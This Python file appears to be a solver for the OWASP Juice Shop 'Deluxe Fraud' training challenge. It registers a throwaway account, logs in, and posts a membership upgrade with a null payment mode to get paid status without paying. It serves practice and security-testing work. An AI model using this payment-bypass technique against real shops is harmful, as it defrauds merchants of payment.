from core.base_solver import BaseSolver
from loguru import logger

class DeluxeFraudSolver(BaseSolver):
    """
    Challenge: Deluxe Fraud (freeDeluxeChallenge)
    
    Trở thành thành viên Deluxe của shop mà không cần thanh toán bất kỳ khoản phí nào.
    Lỗ hổng: improper input validation.
    Gửi request nâng cấp với 'paymentMode': null (None trong Python).
    """
    @property
    def challenge_key(self) -> str:
        return "freeDeluxeChallenge"

    def solve(self) -> bool:
        # 1. Đăng ký tài khoản mới để đảm bảo chưa là Deluxe
        import random
        import string
        email = "".join(random.choices(string.ascii_lowercase, k=10)) + "@juice-sh.op"
        password = "password123"
        
        reg_res = self.client.post("/api/Users", json={
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "answer": "test"}
        })
        
        if not reg_res.ok:
            logger.error(f"Failed to register new user: {reg_res.text}")
            return False
            
        # 2. Đăng nhập
        login_res = self.client.post("/rest/user/login", json={"email": email, "password": password})
        if not login_res.ok:
            logger.error("Failed to login")
            return False
            
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        
        # 3. Thực hiện Deluxe Fraud
        # Payload: paymentMode là null
        payload = {
            "paymentMode": None, 
            "paymentId": "1"
        }
        
        res = self.client.post("/rest/deluxe-membership", json=payload, headers=headers)
        
        if res.ok:
            logger.success("Deluxe Fraud successful!")
            return True
        else:
            logger.error(f"Deluxe Fraud failed: {res.status_code} - {res.text}")
            return False
